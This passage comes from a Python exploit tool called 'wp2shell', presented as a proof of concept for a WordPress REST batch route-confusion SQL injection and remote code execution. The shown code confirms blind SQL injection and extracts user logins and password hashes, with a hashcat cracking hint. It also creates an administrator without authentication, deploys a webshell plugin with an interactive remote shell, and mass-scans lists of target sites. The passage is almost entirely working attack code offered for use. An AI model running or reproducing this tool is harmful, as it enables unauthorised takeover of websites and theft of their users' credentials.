    if pwd is None:
        bad("webshell not responding; aborting interactive mode.")
        return
    cwd = pwd.strip() or "/"
    info("Interactive shell - 'exit' or Ctrl-D to quit.")
    while True:
        try:
            line = input(_paint("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = session.run(path, f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; printf '{_CWD_MARK}%s' \"$(pwd)\"")
        if out is None:
            bad("no response from webshell")
            continue
        body, marker, tail = out.rpartition(_CWD_MARK)
        if marker:
            cwd = tail.strip() or cwd
            out = body
        out = out.rstrip("\n")
        if out:
            print(out)


# ──────────────────────────────────────────────────────────── commands ──
def _http(a: argparse.Namespace) -> HttpConfig:
    headers: Dict[str, str] = {}
    for h in getattr(a, "header", None) or []:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return HttpConfig(
        timeout=getattr(a, "timeout", 30.0),
        proxy=getattr(a, "proxy", None),
        insecure=getattr(a, "insecure", False),
        headers=headers,
        user_agent=getattr(a, "user_agent", None) or _DEFAULT_UA,
        retries=getattr(a, "retries", 2),
        delay=getattr(a, "delay", 0.0),
    )


def _rr(a: argparse.Namespace) -> Optional[bool]:
    return True if getattr(a, "rest_route", False) else None


def cmd_check(a: argparse.Namespace) -> int:
    hc = _http(a)
    hc.timeout = max(hc.timeout, a.sleep + 10)
    client = BatchClient(a.url, http=hc, rest_route=_rr(a), variant=a.variant)

    ver = detect_version(a.url, hc)
    info(f"WordPress version: {classify(ver)}")

    try:
        probe = client.probe()
    except TargetError as e:
        bad(str(e))
        return 1
    if probe.status != 207:
        bad(f"Batch endpoint returned HTTP {probe.status} (not 207) - patched, blocked, or REST API off.")
        return 1
    good(f"Batch endpoint reachable and unauthenticated (HTTP 207) at {client.endpoint}")

    # Primary: version-independent permission-confusion marker (works even if
    # the SQLi sink is object-cached/filtered).
    if client.confusion_markers():
        good("Route confusion ACTIVE - categories request answered by the block-renderer "
             "handler (block_cannot_read); CVE-2026-63030 confirmed.")
    else:
        structural = confusion_structural(client)
        if structural:
            good("Route confusion ACTIVE (structural: inner request returned posts data).")
        else:
            warn("Route confusion markers not observed (may be patched or filtered).")

    sqli = BlindSQLi(client, sleep=a.sleep)
    if sqli.confirm():
        good("SQL injection CONFIRMED - boolean-blind differential over author__not_in (CVE-2026-60137).")
        base, delayed = sqli.time_delay()
        if delayed - base >= a.sleep - 1.0:
            good(f"Time-based channel also confirmed - baseline {base:.2f}s vs injected {delayed:.2f}s.")
        else:
            info(f"Time-based delta only {delayed - base:.2f}s; boolean channel is authoritative here.")
        return 0

    bad("Not exploitable via the batch chain - boolean differential did not separate true/false.")
    if not sqli.has_rows():
        warn("The posts sink returned no rows - a site with 0 published posts can't be read "
             "via the boolean oracle (default installs have the 'Hello world!' post).")
    if ver and ver in _SQLI_ONLY:
        warn("6.8.x has the author__not_in SQLi (CVE-2026-60137) but NOT the batch confusion "
             "(introduced in 6.9.0). Use `sqli` against a facilitating plugin/theme sink instead.")
    else:
        warn("Likely patched (6.9.5 / 7.0.2+), REST disabled, or a persistent object cache "
             "(Redis/Memcached) is deflecting the sink.")
    return 2


def _do_read(sqli: BlindSQLi, *, prefix: str, preset: str,
             query: Optional[str], max_length: int) -> None:
    if query:
        info(f"Reading: {query}")
        val = sqli.extract(query, max_length=max_length, on_char=_progress)
        _clear_progress()
        good(f"Result: {val}")
    elif preset == "fingerprint":
        for label, expr in (("MySQL version", "SELECT @@version"),
                            ("DB user", "SELECT CURRENT_USER()"),
                            ("DB name", "SELECT DATABASE()")):
            good(f"{label}: {sqli.extract(expr, max_length=max_length)}")
    elif preset == "users":
        table = f"{prefix}users"
        try:
            total = sqli.integer(f"SELECT COUNT(*) FROM {table}")
        except ValueError:
            bad(f"could not read a row count from {table} (wrong --prefix, or sink returns no rows).")
            return
        info(f"{total} user(s) in {table}.")
        saw_wp_hash = False
        for off in range(total):
            row = sqli.extract(
                f"SELECT CONCAT_WS(0x7c, ID, user_login, user_pass) FROM {table} ORDER BY ID LIMIT {off},1",
                max_length=max_length, on_char=_progress)
            _clear_progress()
            good(row)
            saw_wp_hash = saw_wp_hash or "$wp$" in row
        if saw_wp_hash:
            info("crack the $wp$2y$ hashes with:  hashcat -m 35500 hashes.txt wordlist.txt "
                 "(bcrypt over HMAC-SHA384; slow by design).")
    info(f"{sqli.requests} request(s) sent.")


def cmd_read(a: argparse.Namespace) -> int:
    client = BatchClient(a.url, http=_http(a), rest_route=_rr(a), variant=a.variant)
    _do_read(BlindSQLi(client), prefix=a.prefix, preset=a.preset,
             query=a.query, max_length=a.max_length)
    return 0


def cmd_sqli(a: argparse.Namespace) -> int:
    hc = _http(a)
    hc.timeout = max(hc.timeout, a.sleep + 10)
    direct = DirectClient(a.url, a.endpoint, a.param, http=hc, true_contains=a.true_contains)
    time_mode = a.true_contains is None
    sqli = BlindSQLi(direct, sleep=a.sleep, time_mode=time_mode)
    info(f"Sink: {a.url.rstrip('/')}{direct.endpoint}  param={a.param}  "
         f"mode={'time-based' if time_mode else 'boolean'}")
    if not sqli.confirm():
        bad("No injection - sink did not react (wrong endpoint/param, or not vulnerable).")
        return 2
    good("author__not_in SQL injection CONFIRMED (CVE-2026-60137).")
    _do_read(sqli, prefix=a.prefix, preset=a.preset, query=a.query, max_length=a.max_length)
    return 0


def cmd_shell(a: argparse.Namespace) -> int:
    hc = _http(a)
    if not a.cmd and not a.interactive:
        bad("specify --cmd or --interactive")
        return 2

    generated: Optional[CreatedAdmin] = None
    if a.user and a.password:
        user, password = a.user, a.password
        info(f"Using supplied credentials for {user!r}.")
    else:
        info("No credentials supplied - creating a fresh administrator pre-auth (no hash, no crack) ...")
        try:
            generated = PreAuthAdminCreator(a.url, http=hc, rest_route=_rr(a)).create_admin()
        except Exception as exc:  # noqa: BLE001
            bad(f"pre-auth admin creation failed: {exc}")
            warn("Fall back to a cracked existing admin via --user/--password (see `read --preset users`).")
            return 1
        user, password = generated.username, generated.password
        good(f"Administrator created: {user} / {password}  (borrowed admin id {generated.source_admin_id})")

    warn("This uploads a plugin containing a webshell to the target.")
    session = AdminSession(a.url, http=hc)
    info(f"Authenticating as {user!r} ...")
    if not session.login(user, password):
        bad("Login failed.")
        return 1
    good("Authenticated.")
    info("Deploying webshell plugin ...")
    path = session.deploy_webshell()
    good(f"Webshell: {a.url.rstrip('/')}{path}")
    rc = 0
    if a.cmd:
        out = session.run(path, a.cmd)
        if out is None:
            bad("No output - upload likely failed (nonce/permissions) or plugin not web-served.")
            rc = 1
        else:
            print()
            print(out.rstrip("\n"))
            print()
    if a.interactive:
        _repl(session, path)
    warn(f"Remove the webshell when finished (delete {path} on the target).")
    if generated:
        warn(f"Also remove the generated administrator {generated.username!r} on the target.")
    return rc


def _load_targets(arg: str) -> List[str]:
    """A single URL, or a .txt file with one target per line (# comments ok)."""
    if arg.startswith(("http://", "https://")):
        return [arg]
    try:
        with open(arg) as fh:
            return [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
    except (FileNotFoundError, IsADirectoryError, OSError):
        return ["http://" + arg]


def cmd_scan(a: argparse.Namespace) -> int:
    targets = _load_targets(a.target)
    if not targets:
        bad("no targets")
        return 1
    hc = _http(a)
    info(f"scanning {len(targets)} target(s) with {a.threads} thread(s)"
         + (" [--prove: extracting @@version on hits]" if a.prove else "") + " ...")

    def _one(url: str) -> dict:
        rec: Dict[str, Any] = {"url": url}
        try:
            ver = detect_version(url, hc)
            rec["version"] = ".".join(map(str, ver)) if ver else None
            client = BatchClient(url, http=hc, variant=a.variant)
            if client.probe().status != 207:
                rec["status"] = "no-batch-endpoint"
                return rec
            sqli = BlindSQLi(client, sleep=a.sleep)
            if sqli.confirm():
                rec["status"] = "VULNERABLE"
                if a.prove:
                    rec["proof_db_version"] = sqli.extract("SELECT @@version", max_length=64)
            else:
                rec["status"] = "confusion" if client.confusion_markers() else "safe"
        except Exception as exc:
            rec["status"] = "error"
            rec["error"] = str(exc)[:120]
        return rec

    results: List[dict] = []
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        futs = {ex.submit(_one, u): u for u in targets}
        for i, f in enumerate(as_completed(futs), 1):
            r = f.result()
            results.append(r)
            tag = {"VULNERABLE": _paint("31", "VULNERABLE"),
                   "safe": _paint("32", "safe"),
                   "confusion": _paint("33", "confusion-only")}.get(
                r.get("status", ""), r.get("status", "?"))
            extra = f"  db={r['proof_db_version']}" if r.get("proof_db_version") else ""
            print(f"[{i}/{len(targets)}] {r['url']}  [{r.get('version') or '?'}]  {tag}{extra}")
    if a.json:
        with open(a.json, "w") as fh:
            json.dump(results, fh, indent=2)
        good(f"JSON report written to {a.json}")
    vuln = sum(1 for r in results if r.get("status") == "VULNERABLE")
    info(f"done - {vuln}/{len(results)} vulnerable")
    return 0


# ──────────────────────────────────────────────────────────── parser ──
def _net_opts(p: argparse.ArgumentParser) -> None:
    p.add_argument("--timeout", type=float, default=30.0, help="request timeout (default: 30)")
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    p.add_argument("--insecure", action="store_true", help="skip TLS certificate verification")
    p.add_argument("-H", "--header", action="append", metavar="'K: V'",
                   help="extra request header (repeatable)")
    p.add_argument("--user-agent", help=f"override User-Agent (default: a browser UA)")
    p.add_argument("--retries", type=int, default=2, help="retries on network errors (default: 2)")
    p.add_argument("--delay", type=float, default=0.0, help="seconds between requests (rate-limit)")


def _common(p: argparse.ArgumentParser) -> None:
    p.add_argument("url", help="target base URL, e.g. https://target")
    p.add_argument("--rest-route", action="store_true",
                   help="force /?rest_route=/batch/v1 (default: auto-detect)")
    p.add_argument("--variant", choices=("posts", "categories"), default="posts",
                   help="route-confusion carrier variant (default: posts = verified)")
    _net_opts(p)


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="wp2shell",
        description="Unified WordPress REST batch route-confusion SQLi/RCE PoC (CVE-2026-63030).")
    ap.add_argument("--version", action="version", version=f"wp2shell {__version__}")
    ap.add_argument("--no-color", action="store_true", help="disable ANSI colour")
    sub = ap.add_subparsers(dest="command", required=True)

    c = sub.add_parser("check", help="fingerprint + safely confirm the vuln (non-destructive)")
    _common(c)
    c.add_argument("--sleep", type=float, default=3.0, help="confirmation delay (default: 3)")
    c.set_defaults(func=cmd_check)

    r = sub.add_parser("read", help="read the database via blind SQL injection")
    _common(r)
    g = r.add_mutually_exclusive_group()
    g.add_argument("--preset", choices=("fingerprint", "users"), default="fingerprint",
                   help="fingerprint (version/user/db) or users (logins + password hashes)")
    g.add_argument("--query", help='scalar SQL to read, e.g. "SELECT @@version"')
    r.add_argument("--prefix", default="wp_", help="DB table prefix (default: wp_)")
    r.add_argument("--max-length", type=int, default=128, help="max chars per value")
    r.set_defaults(func=cmd_read)

    s = sub.add_parser("shell", help="RCE: create a fresh admin pre-auth (default), then plugin webshell")
    _common(s)
    s.add_argument("--user", help="use an existing admin instead of creating one (skips pre-auth)")
    s.add_argument("--password", help="existing admin password (used with --user)")
    s.add_argument("--cmd", help="command to run on the target")
    s.add_argument("-i", "--interactive", action="store_true", help="open an interactive shell")
    s.set_defaults(func=cmd_shell)

    q = sub.add_parser("sqli", help="author__not_in SQLi against a direct/facilitated sink (e.g. 6.8.x)")
    q.add_argument("url", help="target base URL")
    q.add_argument("--endpoint", required=True,
                   help="path of the facilitating sink, e.g. /?some_route=1")
    q.add_argument("--param", default="author_not_in",
                   help="request parameter that reaches WP_Query author__not_in")
    q.add_argument("--true-contains",
                   help="response substring present only when rows match (enables fast boolean mode)")
    q.add_argument("--sleep", type=float, default=3.0, help="time-based delay (default: 3)")
    gq = q.add_mutually_exclusive_group()
    gq.add_argument("--preset", choices=("fingerprint", "users"), default="fingerprint")
    gq.add_argument("--query", help="scalar SQL to read")
    q.add_argument("--prefix", default="wp_", help="DB table prefix (default: wp_)")
    q.add_argument("--max-length", type=int, default=128)
    _net_opts(q)
    q.set_defaults(func=cmd_sqli)

    sc = sub.add_parser("scan", help="threaded vuln-check over a single URL or a .txt of targets")
    sc.add_argument("target", help="a single URL, or a .txt file with one target per line")
    sc.add_argument("--variant", choices=("posts", "categories"), default="posts")
    sc.add_argument("--threads", type=int, default=10, help="worker threads (default: 10)")
    sc.add_argument("--sleep", type=float, default=3.0, help="confirmation delay (default: 3)")
    sc.add_argument("--prove", action="store_true", help="on hits, extract @@version as proof")
    sc.add_argument("--json", help="write a JSON report to this path")
    _net_opts(sc)
    sc.set_defaults(func=cmd_scan)
    return ap


def main(argv: Optional[list] = None) -> int:
    args = build_parser().parse_args(argv)
    global _COLOR
    if getattr(args, "no_color", False):
        _COLOR = False
    if _TTY:
        print(_paint("36", BANNER))
    try:
        return args.func(args)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:  # noqa: BLE001
        bad(str(exc))
        return 1


if __name__ == "__main__":
    sys.exit(main())
